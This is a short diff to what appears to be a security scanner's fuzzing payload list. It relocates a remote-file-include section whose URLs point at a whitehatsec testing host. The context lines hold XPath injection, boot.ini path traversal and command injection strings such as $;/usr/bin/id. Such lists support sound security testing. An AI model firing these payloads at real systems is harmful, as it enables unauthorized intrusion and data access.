@@ -192,11 +192,6 @@ admin' and substring(password/text(),1,1)='7
 ..\..\..\..\..\..\..\..\..\..\boot.ini
 ../../../../../../../../../../../../
 ..\..\..\..\..\..\..\..\..\..\..\..\
-#############REMOTE FILE INCLUDE
-http://xss.whitehatsec.com/.testing/rfi_vuln.txt
-http://xss.whitehatsec.com/.testing/rfi_vuln.txt%00
-https://whitehatsec.com/.testing/rfi_vuln.txt
-https://whitehatsec.com/.testing/rfi_vuln.txt%00
 #############COMMAND INJECTION
 `
 || 
@@ -345,3 +340,8 @@ $;/usr/bin/id
 ((
 )
 (
+#############REMOTE FILE INCLUDE
+http://xss.whitehatsec.com/.testing/whitehatsec.txt
+http://xss.whitehatsec.com/.testing/whitehatsec%00
+https://whitehatsec.com/.testing/whitehatsec.txt
+https://whitehatsec.com/.testing/whitehatsec.txt%00
